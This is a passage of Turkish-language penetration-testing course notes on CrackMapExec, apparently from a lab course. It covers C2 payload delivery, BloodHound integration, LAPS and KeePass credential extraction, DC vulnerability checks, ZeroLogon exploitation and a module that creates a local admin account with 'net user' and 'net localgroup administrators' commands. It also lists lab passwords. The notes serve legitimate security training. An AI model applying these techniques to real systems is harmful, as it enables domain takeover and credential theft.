+Metasploit'te yeni bir oturum görmeliyiz:
+
+![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)
+
+
+### Other C2 Frameworks
+Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.
+
+Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:
+
+![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)
+
+Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.
+
+
+### Bloodhound Entegrasyonu
+
+BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.
+
+
+### Bloodhound Mark Sahipli olarak
+
+BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.
+
+CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:
+
+* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
+* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
+* bh_port'u veritabanı portuna ayarlayın
+* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).
+
+Yapılandırma aşağıdaki gibi görünmelidir:
+
+
+### Configuring BloodHound Database
+
+![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)
+
+Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.
+
+
+### Bloodhound Verilerinin Toplanması
+BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.
+
+
+### BloodHound verilerinin toplanması
+
+![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
+![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)
+
+![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)
+
+
+![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
+![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)
+
+Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.
+
+
+### BloodHound'da Kullanıcıları Owned Olarak Ayarlama
+
+Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.
+
+
+### Kullanıcı BloodHound'da Owned Olarak Eklendi
+
+![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)
+
+Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.
+
+
+### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
+![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
+![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
+![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
+![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)
+
+Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.
+
+
+### BloodHound'da Bilgisayarları Owned Olarak Ayarlama
+
+Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.
+
+![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)
+
+![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)
+
+
+BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.
+
+
+### Popular Modules
+
+CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.
+
+
+### LDAP Protocol Modules
+
+LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.
+
+
+### **LDAP Module - get-network**
+
+get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.
+
+Modülü kullanmanın üç (3) yolu vardır:
+Sadece IP adresini almak.
+Sadece domain isimlerini al.
+Her ikisini de al (IP ve domain adları).
+
+Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.
+
+
+### DNS Sunucusundan Kayıtları Alma
+![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)
+
+![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
+![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)
+
+![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)
+
+Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir
+
+
+### LDAP Module - laps
+Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.
+
+
+### LAPS Modülü Parolaların Alınması
+![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)
+
+![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
+![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)
+
+Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır
+
+
+### LDAP Modülü - MAQ
+[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.
+
+Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.
+
+
+### Machine Quota Module
+![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)
+
+
+### LDAP Module - daclread
+
+Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:
+
+
+### daclread Module Options
+
+![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)
+
+Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:
+
+
+### Grace Kullanıcısının DACL'sini Oku
+
+![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
+![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)
+
+
+Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.
+
+
+### Searching for Users with DCSync Rights
+![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
+![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
+![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)
+
+Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.
+
+LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+### LDAP Protocol Modules
+
+![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)
+
+
+
+### SMB Protocol Modules
+SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.
+
+Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.
+
+
+### SMB Modülleri - get_netconnections ve ioxidresolver
+Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.
+
+get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.
+
+
+### get_netconnections Module
+![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)
+
+
+Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.
+
+
+### ioxidresolver Module
+![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
+![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)
+
+Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.
+
+
+### SMB Module - keepass_discover
+
+KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.
+
+### KeePass'i Keşfetme
+
+![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)
+
+Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.
+
+Bunu kullanmak için beş (5) adıma ihtiyacımız var:
+
+21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
+22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.
+
+### KeePass Yapılandırma Dosyasına Trigger Ekleme
+![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
+Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.
+
+Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.
+
+![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)
+
+ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.
+
+
+### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
+![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)
+
+![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)
+
+ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin
+
+
+### Clean Configuration File Changes
+
+![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
+![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)
+
+Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.
+
+
+### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma
+
+![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
+![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
+Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.
+
+
+### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
+Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.
+
+Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.
+
+
+### RDP'yi Etkinleştirme
+![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
+![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)
+
+SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+
+### SMB Protocol Modules
+![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)
+
+Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız
+
+
+### Vulnerability Scan Modules
+Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.
+
+CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.
+
+
+### Ortamın Kurulması
+Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.
+
+Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız
+
+
+### Chisel'i Hedef Makineye Gönderme
+![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)
+
+
+### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
+![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
+![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)
+
+
+### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama
+
+![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)
+
+
+### Vulnerability Scan Modules
+
+CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.
+
+
+### ZeroLogon
+Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.
+
+CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.
+
+
+### ZeroLogon Güvenlik Açığı Kontrolü
+![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)
+
+
+### PetitPotam
+Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.
+
+CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.
+
+
+### Petitpotam Güvenlik Açığı Kontrolü
+![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)
+
+
+### noPAC
+noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.
+
+CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.
+
+
+### noPAC vulnerability check
+![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
+![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)
+
+
+### DFSCoerce
+Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.
+
+Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.
+
+
+### DFSCoerce Vulnerability Check
+![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)
+
+
+### ShadowCoerce
+ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.
+
+CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.
+
+
+### ShadowCoerce Vulnerability Check
+![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
+![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)
+
+Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.
+
+CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz
+
+
+### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
+![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
+![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
+![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
+![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
+![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)
+
+DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.
+
+
+### MS17-010 (EternalBlue)
+MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.
+
+CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.
+
+
+### MS17-010 Vulnerability Check
+![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)
+
+
+### Güvenlik Açığından Yararlanma
+Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:
+
+
+### Exploiting ZeroLogon
+
+![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)
+
+![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
+![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
+![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)
+
+Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.
+
+Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.
+
+
+### Kendi CME Modülümüzü Oluşturmak
+Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.
+
+
+### CrackMapExec'i Poetry ile derleyin
+Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın
+
+Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).
+
+
+### VSCode'un Kurulması ve Çalıştırılması
+![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)
+
+Daha sonra açmak için kod yazabiliriz 
+
+![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)
+
+
+### Yeni Modülümüzü Oluşturun
+Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
+23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
+24. Aşağıdaki kod örneğini dosyaya kopyalayın:
+
+![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
+![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)
+
+25. Şimdi modülümüzü özelleştirelim.
+
+Bazı değişkenleri tanımlamamız gerekiyor:
+* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
+* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
+* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
+* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
+* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.
+
+Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.
+
+![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
+![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)
+
+26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).
+
+Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.
+
+![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
